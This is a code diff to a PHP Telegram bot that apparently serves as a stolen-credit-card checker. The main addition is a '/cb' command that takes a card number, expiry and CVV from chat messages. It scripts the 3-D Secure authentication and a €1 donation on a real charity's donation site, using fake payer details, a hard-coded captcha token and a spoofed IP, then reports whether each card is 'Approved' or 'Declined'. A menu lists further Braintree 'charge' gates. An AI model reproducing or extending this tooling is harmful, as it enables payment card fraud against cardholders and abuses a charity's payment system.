@@ -419,7 +419,7 @@ $message = "!".$data."";
 // 
 
 
-
+unlink("cookie.txt");
 
 
 if ($myid == $id) {
@@ -743,7 +743,15 @@ $chat_id_chanel = '-1001697730096'; //CANAL DEL GRUPO
 
 $file_id = $photo_token;
 $i = "<a href='https://t.me/ReferenciasAlyaSan'>么</a>";
-$descripcion = "<i>Referencias</i> 𝐀𝐥𝐲𝐚-𝐒𝐚𝐧 🔥\n- - - - - - - - - - - - - - - - - - - -\n[$i] <b>Message:</b> $message\n[$i] <b>ID:</b> <code>$user_id</code>\n[$i] <b>Username:</b> @$user_username\n[$i] <b>Name:</b> $user_first_name $user_last_name\n- - - - - - - - - - - - - - - - - - - -\n";
+
+if (!empty($message)){
+$mesa = "[$i] <b>Message:</b> $message\n";
+}
+if (!empty($user_id)){
+$us = "[$i] <b>ID:</b> <code>$user_id</code>\n";
+}
+
+$descripcion = "<i>Referencias</i> 𝐀𝐥𝐲𝐚-𝐒𝐚𝐧 🔥\n- - - - - - - - - - - - - - - - - - - -\n".$mesa."".$us."[$i] <b>Username:</b> @$user_username\n[$i] <b>Name:</b> $user_first_name $user_last_name\n- - - - - - - - - - - - - - - - - - - -\n";
 
 $url = $GLOBALS["website"] . "/sendPhoto";
 $ch = curl_init($url);
@@ -841,7 +849,7 @@ elseif((strpos($message, "!gts") === 0)||(strpos($message, "/gts") === 0)||(strp
 }
 
 elseif((strpos($message, "!chds") === 0)||(strpos($message, "/chds") === 0)||(strpos($message, ".chds") === 0)) {
-        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Chargeds\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree Charged ($50) ✔\n➣ Command ➟ /stp\n⁕ Status: ON!✅\n\n🔥 Braintree Charged ($5) ✔\n➣ Command ➟ /go\n⁕ Status: ON!✅\n\n🔥 Charged ($5) ✔\n➣ Command ➟ /en\n⁕ Status: ON!✅\n\n🔥 Charged ($5) ✔\n➣ Command ➟ /br\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
+        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Chargeds\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree Charged ($50) ✔\n➣ Command ➟ /stp\n⁕ Status: ON!✅\n\n🔥 Braintree Charged ($5) ✔\n➣ Command ➟ /go\n⁕ Status: ON!✅\n\n🔥 Charged (€1) ✔\n➣ Command ➟ /cb\n⁕ Status: ON!✅\n\n🔥 Charged ($5) ✔\n➣ Command ➟ /en\n⁕ Status: ON!✅\n\n🔥 Charged ($5) ✔\n➣ Command ➟ /br\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
         sendMessage($chat_id,$respuesta,$message_id);
 }
 
@@ -1514,6 +1522,310 @@ ob_flush();
 
 
 
+elseif((strpos($message, "!cb") === 0)||(strpos($message, "/cb") === 0)||(strpos($message, ".cb") === 0)){
+//$lista = preg_replace('/\s+/', '', $lista);
+$lista = substr($message, 4);
+$i = preg_split('/[|:| ]/', $lista);
+$cc    = $i[0];
+$mes   = $i[1];
+$ano   = $i[2];
+$cvv   = $i[3];
+
+$bin = substr($lista, 0, 6);
+if (strlen($ano) == 2) {
+    $ano = '20' . $ano;
+}
+
+if (strlen($mes) == 1 && $mes <= 9) {
+    $mes = '0' . $mes;
+}
+
+
+$lista = "$cc|$mes|$ano|$cvv";
+
+$bin = substr($lista, 0, 6);
+//-----------------------------------------------------//
+
+
+$longitud_cc = (substr($cc, 0, 2) == "37" || substr($cc, 0, 2) == "34") ? 15 : 16;
+if (!is_numeric($cc) || strlen($cc) != $longitud_cc || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
+    $respuesta = "🚫 Oops!\nUse this format: /cb CC|MM|YYYY|CVV\n";
+    sendMessage($chat_id, $respuesta, $message_id);
+    die();
+}
+
+//----------------MENSAGE DE ESPERA-------------------//
+$respuesta = "<b>🕒 Wait for Result...</b>";
+sendMessage($chat_id,$respuesta, $message_id);
+//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
+$id_text = file_get_contents("ID");
+//----------------------------------------------------//
+
+
+$startTime = microtime(true); //TIEMPO DE INICIO
+$BinData = BinData($bin); //Extrae los datos del bin
+
+///AGREGA EL + O %20///
+$longitud = 4;
+$partes = [];
+for ($i = 0; $i < strlen($cc); $i += $longitud) {
+    $parte = substr($cc, $i, $longitud);
+    $partes[] = $parte;
+}
+
+$longitud1 = 4;
+$partes1 = [];
+for ($i = 0; $i < strlen($cc); $i += $longitud1) {
+    $parte1 = substr($cc, $i, $longitud1);
+    $partes1[] = $parte1;
+}
+
+$cc1 = implode('+', $partes1);
+$cc = implode('%20', $partes);
+//echo "$cc1\n";
+////EXTRAE EL SCHEME Y BRAND////
+$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+$content = curl_exec($curl);
+curl_close($curl);
+$binna = json_decode($content,true);
+//---------------------------------------------//
+$brand = $binna['scheme'];
+if (empty($brand)) {
+$brand = "Unavailable";
+}
+//VARIABLES//
+$MV = strtoupper(trim($brand));
+$MV1 = ucfirst(strtolower(trim($brand)));
+
+echo "$MV\n";
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://cbm.agitate.ie/donate/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'Accept-Language: es-US,es;q=0.6',
+    'Referer: https://www.cbm.ie/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+preg_match('/name="dOrderid" value="([^"]+)"/', $response, $match);
+$dOrderid = $match[1];
+curl_close($curl);
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://cbm.agitate.ie/api/p/global/3ds_version/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => '{"card":{"number":"'.$cc.'"}}',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'Content-Type: application/json',
+    'sec-ch-ua-platform: "Android"',
+    'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"',
+    'sec-ch-ua-mobile: ?1',
+    'Sec-GPC: 1',
+    'Accept-Language: es-US,es;q=0.6',
+    'Origin: https://cbm.agitate.ie',
+    'Sec-Fetch-Site: same-origin',
+    'Sec-Fetch-Mode: cors',
+    'Sec-Fetch-Dest: empty',
+    'Referer: https://cbm.agitate.ie/donate/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+curl_close($curl);
+
+
+preg_match('/"enrolled":\s*"([^"]+)"/', $response, $matches);
+$enrolled = $matches[1];
+preg_match('/"serverTransactionId":\s*"([^"]+)"/', $response, $matches);
+$serverTransactionId = $matches[1];
+
+//preg_match('/"methodUrl":\s*"([^"]+)"/', $response, $matches);
+//$methodUrl = $matches[1];
+//preg_match('/"methodData":\s*"([^"]+)"/', $response, $matches);
+//$methodData = $matches[1];
+//echo "Enrolled: $enrolled\n";
+//echo "Server Transaction ID: $serverTransactionId\n";
+//echo "Method URL: $methodUrl\n";
+//echo "Method Data: $methodData\n";
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://cbm.agitate.ie/api/p/global/3ds_authentication/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => '{"serverTransactionId":"'.$serverTransactionId.'","authenticationRequestType":"PAYMENT_TRANSACTION","methodUrlComplete":true,"merchantContactUrl":"http://example.com/contact","card":{"number":"'.$cc.'","scheme":"'.$MV.'","expMonth":"'.$mes.'","expYear":"'.$ano.'","cvn":"'.$cvv.'","cardHolderName":""},"order":{"amount":"1.00","id":"1737773302132024858"},"payer":{"name":"","firstname":"Carlos","lastname":"Perez","email":"Dausitherer%40cuvox.de","billing_address":{"line1":"6195%20bollinger%20rd","line2":"","city":"New%20york","postal_code":"10010","country":"US"}},"serverData":{"acceptHeader":"text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/avif%2Cimage/webp%2Cimage/apng%2C%2A/%2A%3Bq%3D0.8","ip":"138.84.62.101"},"challengeWindow":{"windowSize":"WINDOWED_600X400","displayMode":"lightbox"},"authenticationSource":"BROWSER","messageCategory":"PAYMENT_AUTHENTICATION","challengeRequestIndicator":"NO_PREFERENCE","browserData":{"colorDepth":"TWENTY_FOUR_BITS","javaEnabled":false,"javascriptEnabled":true,"language":"es-US","screenHeight":800,"screenWidth":360,"time":"2025-01-25T02:47:56.891Z","timezoneOffset":6,"userAgent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"}}',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'Content-Type: application/json',
+    'sec-ch-ua-platform: "Android"',
+    'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"',
+    'sec-ch-ua-mobile: ?1',
+    'Sec-GPC: 1',
+    'Accept-Language: es-US,es;q=0.6',
+    'Origin: https://cbm.agitate.ie',
+    'Sec-Fetch-Site: same-origin',
+    'Sec-Fetch-Mode: cors',
+    'Sec-Fetch-Dest: empty',
+    'Referer: https://cbm.agitate.ie/donate/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$data = json_decode($response, true);
+curl_close($curl);
+
+
+
+$status_cha = $data["status"];
+if ($status_cha == "CHALLENGE_REQUIRED"){
+
+$respo = "CHALLENGE_REQUIRED";
+
+} else {
+
+
+$result = $data["result"];
+$status = $data["response"]["status"];
+$status_reason = $data["response"]["status_reason"];
+$ds_trans_id = $data["response"]["ds_trans_id"];
+$authentication_value = $data["response"]["authentication_value"];
+//$error = $data['errorDetail']; // Output: Card type is too long.<br />Card type is invalid.
+
+$errorDetail = strip_tags($data['errorDetail']);
+$errorDetail = preg_replace('/\s+/', ' ', $errorDetail);
+$error = trim($errorDetail);
+
+echo $errorDetail;
+
+//echo "Status: $status\n";
+//echo "Status Reason: $status_reason\n";
+//echo "Ds_trans_id: $ds_trans_id\n";
+//echo "authentication_value: $authentication_value\n";
+
+$authentication_value = urlencode($authentication_value);
+//echo "authentication_value: $authentication_value\n";
+
+
+if ($result == "AUTHORIZATION_SUCCESS"){
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://cbm.agitate.ie/donate/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'g-recaptcha-token=03AFcWeA56hyuUamXT1086PZw6crImdzozgkcvyLG3afFGh_XsCem4lB39A-YV-bWQWRxf73KIdpEFUyRyXo-y0qz81I5bfFjoIL5mB3NBXwhTFQZ77ZP-ICCP2LwuV0slbCYNNVj8j2BUEikVKG2FY9XbZrX8AHLv6nnMkhKcV7kSJUJVcXHLl_l9S4BEylzRnY7t5Y04YgDpCWOrer0IW1_UYY-mA1Fikt2C9YRrNTmtnHBRx4JPkKUFfRKPdIJJ-9QBizGYIQ9AmZmRaokaZ4RWcdRKWcwv_LlYlTDyP0z3taC-V_u5td2K2tNNMv-koEh-dhcXY_2dZWJcfHj0AfPUdlAaokGv8u_Nvip_kT6aPuZnLXie8aKEFqHptDTlqLZowY_tPsgTxW7KGLMA-ndIlTgdWMV0YmiYiUxSqxfmUHmFSX--nnimLGOFEF4nCAtCQpQM1qlBOHeSG9lhsqsq6MstK6jckD7ogEguFIbCSFbFoNi9ZddHLUhQ0hx2NnAtrYKVXNKoC2LHR9qz_S3sgFskHnJnb1oMfsomFL7-IVtAl-uALakk5wkBBGBdSUIeWSrbkPoDORyiKH0o1t2v5Jd5pp0D0muQUQlT2_vGZSY-wXQLYvgRgrTcanwhTNiL-L7BCSQKVDflBBR1RLXwJpfw2ca5pM1PUGIRFednoYQ6lGnNywdbVymYk_MqwFO5r0_-tpcPqUxGUWITIED7o2B2FhUeeDJ7RHbtxHKrB15ygLfH-qVqt6zz29vfEEEVt-dZmz1DrUf70J_tZZ44UT89uZ-vmrZ0H6SPOhs_baQWZ_0pkwPIjY9R7nm8NEVV1uj7gSpYF0hkrBj5DVA1XtpnxarYeZsBhOmpQe2aLYBulibsHHu06bL6UHpJOlp18PGjt0GUMbmfzODS-HqleB2q2IdaWWoEN6YBj8QhtU0E3Jo4CYA&_action=donate&dOrderid='.$dOrderid.'&dFrequency=once&dAmount=1.00&dMethod=card&dCardProcessor=globalpayments&dCardtype='.$MV.'&dBankProcessor=&dIp=138.84.62.101&dAccept=text%2Fhtml%252Capplication%2Fxhtml%252Bxml%252Capplication%2Fxml%253Bq%253D0.9%252Cimage%2Favif%252Cimage%2Fwebp%252Cimage%2Fapng%252C%252A%2F%252A%253Bq%253D0.8&frequency=once&amount-flexible=1.00&confirmAmmount=1.00&name=&firstname=Carlos&lastname=Perez&address=6195+bollinger+rd&address-line2=&city=New+york&county=&country=US&postcode=10010&email=Dausitherer%40cuvox.de&mobile=%2B524179204022&custom-1=Social+Media&consent-email=1&cc-number='.$cc1.'&cc-exp-month='.$mes.'&cc-exp-year='.$ano.'&cc-csc='.$cvv.'&dCard3ds=auth_frictionless&eci=05&ds_trans_id='.$ds_trans_id.'&authentication_value='.$authentication_value.'',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'Content-Type: application/x-www-form-urlencoded',
+    'sec-ch-ua-platform: "Android"',
+    'Origin: https://cbm.agitate.ie',
+    'Accept-Language: es-US,es;q=0.6',
+    'Referer: https://cbm.agitate.ie/donate/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+preg_match('/(\d+: .*?)<\/p>/', $response, $match);
+$respo = $match[1];
+
+file_put_contents('/sdcard/index.html', $response);
+curl_close($curl);
+
+}
+//echo "RESPO: $respo\n";
+
+}
+
+if (empty($respo)){
+$respo = $status_reason ?? $status;
+}
+if (!empty($error)){
+$respo = $error;
+}
+
+//echo "RESPO1: $respo\n";
+
+
+
+$timetakeen = (microtime(true) - $startTime);
+$time = substr_replace($timetakeen, '', 4);
+$proxy = "LIVE ✅";
+
+$bin = "<code>".$bin."</code>";
+$lista = "<code>".$lista."</code>";
+
+
+if (empty($respo)) {
+        $respo = $response;
+}
+
+/*if ($respo == "SUCCEEDED"){
+    $respo = "Charged $5";
+}*/
+
+
+$logo = "<a href='http://t.me/XNazunaBot'>[↯]</a>";
+
+if (array_in_string($respo, $live_array)) {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged €1\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = True;
+} elseif (strpos($respo, 'Declined') !== false || strpos($respo, 'CARD_AUTHENTICATION_FAILED') !== false || strpos($respo, 'INVALID CARD') !== false || strpos($respo, 'UNABLE TO AUTH') !== false || strpos($respo, 'Card type is too long.Card type is invalid.') !== false) {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged €1\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = False;
+} elseif (strpos($respo, 'CHALLENGE_REQUIRED') !== false) {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged €1\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐑𝐞𝐣𝐞𝐜𝐭𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = False;
+} else {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged €1\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐆𝐀𝐓𝐄 𝐄𝐑𝐑𝐎𝐑 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = False;
+}
+
+if ($live) {
+    editMessage($chat_id, $respuesta, $id_text);
+} else {
+    editMessage($chat_id, $respuesta, $id_text);
+}
+
+//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
+ob_flush();
+
+
+ }
+
+
+
 
 
 
@@ -1652,6 +1964,7 @@ if ($respo == "SUCCEEDED"){
 }
 // Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
 $logo = "<a href='http://t.me/XNazunaBot'>[↯]</a>";
+unlink('cookie.txt');
 
 if (array_in_string($respo, $live_array)) {
     $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
